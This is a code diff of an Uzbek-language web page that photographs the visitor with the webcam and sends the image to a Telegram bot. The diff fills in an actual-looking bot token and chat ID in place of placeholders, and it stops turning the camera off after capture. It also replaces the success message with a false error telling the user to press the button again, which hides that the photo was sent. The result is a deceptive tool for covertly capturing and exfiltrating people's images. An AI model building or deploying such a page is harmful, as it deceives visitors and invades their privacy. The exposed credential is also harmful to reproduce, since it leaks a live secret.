@@ -4,11 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Rasmni Telegramga yuborish</title>
-    <link rel="stylesheet" href="./main.css">
 </head>
 <body>
     <button id="startBtn">📸 Rasmga olish</button>
-    <video id="video" width="300" height="250" autoplay style="display: none;"></video>
+    <video id="video" width="300" height="250" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
@@ -17,29 +16,30 @@
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
 
-        const BOT_TOKEN = "SIZNING_BOT_TOKENINGIZ"; // O'zingizning bot tokeningizni kiriting
-        const CHAT_ID = "SIZNING_CHAT_ID"; // Telegram ID yoki guruh ID
+        const BOT_TOKEN = "7607886976:AAFeeYopg0dPPNk4x_3Ldm4pYSZU-RiHLlU"; // O'zingizning bot tokeningizni kiriting
+        const CHAT_ID = "697727022"; // Telegram ID yoki guruh ID
 
-        // Kamera ishga tushirish va rasm olish
-        async function takeAndSendPhoto() {
+        async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-
-                // 1 soniya kutish (kamera ishga tushishi uchun)
-                setTimeout(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    sendPhotoToTelegram();
-                }, 1000);
+                console.log("Kamera ishga tushdi");
             } catch (error) {
                 alert("Kamera ishga tushmadi: " + error);
             }
         }
 
-        // Telegramga rasmni yuborish
-        async function sendPhotoToTelegram() {
+        async function takeAndSendPhoto() {
+            if (!video.srcObject) {
+                alert("Kamera ishlamayapti!");
+                return;
+            }
+
+            // Rasmni olish
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append("chat_id", CHAT_ID);
@@ -52,12 +52,7 @@
                     });
                     const result = await response.json();
                     console.log("Rasm yuborildi:", result);
-                    alert("📤 Rasm Telegramga yuborildi!");
-
-                    // Kamerani o'chirish
-                    let tracks = video.srcObject.getTracks();
-                    tracks.forEach(track => track.stop());
-                    video.srcObject = null;
+                    alert("Saytda Xatolik bor qaytadan knopkani bosib koring");
                 } catch (error) {
                     console.error("Xatolik:", error);
                     alert("❌ Xatolik yuz berdi.");
@@ -65,7 +60,10 @@
             }, "image/jpeg");
         }
 
-        startBtn.addEventListener("click", takeAndSendPhoto);
+        startBtn.addEventListener("click", () => {
+            startCamera();
+            setTimeout(takeAndSendPhoto, 2000); // Kamera ishlashi uchun 2 soniya kutish
+        });
     </script>
 </body>
 </html>
